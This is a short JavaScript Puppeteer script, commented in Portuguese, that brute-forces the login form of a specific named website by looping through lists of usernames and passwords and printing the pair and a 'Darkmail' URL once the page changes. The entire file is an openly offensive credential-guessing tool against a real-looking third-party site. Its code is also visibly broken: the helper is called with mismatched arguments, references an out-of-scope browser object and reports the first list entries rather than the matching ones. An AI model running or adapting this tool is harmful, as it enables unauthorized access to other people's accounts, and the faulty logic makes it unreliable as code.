const puppeteer = require("puppeteer");

const startURL = "http://institutopurifica.com.br/email/index.php";

const usuarios = ["001", "002"];
const senhas = ["a", "bb", "ccc", "dddd"];

let usuarioIndex = 0;
let senhaIndex = 0;

const test = async (page, usuarioIndex, senhaIndex) => {
  await page.goto(startURL);

  await page.type("input[name=usuario]", usuarios[usuarioIndex]);
  await page.type("input[name=senha]", senhas[senhaIndex]);

  await page.keyboard.press("Enter");
  await page.waitForNavigation();

  if (page.url() === "http://institutopurifica.com.br/email/index.php") {
    // é uma retentativa, testar com a próxima senha
    senhaIndex++;

    if (senhaIndex == senhas.length) {
      // se todas as senhas daquele usuário foram testadas, ir para o próximo usuário
      usuarioIndex++;
      // se é um novo usuário, as senhas tem que voltar a ser testadas desde o início
      senhaIndex = 0;
    }

    if (usuarioIndex == usuarios.length) {
      // se todos usuários foram testados
      console.error("Foi triste. Não era nenhuma das senhas");
      await browser.close();
    }

    // enquanto não foram testados todas as senhas e usuários, chama de novo
    await test(page, usuarioIndex, senhaIndex);
  } else {
    console.log("O usuário e a senha são:");
    console.log("Usuário:" + usuarios[0]);
    console.log("Senha:" + senhas[0]);
    console.log("E a url do Darkmail é:" + page.url());
    await browser.close();
  }
};

(async () => {
  const browser = await puppeteer.launch({ headless: false });
  const page = await browser.newPage();

  await test(page, browser, usuarioIndex, senhaIndex);
})();
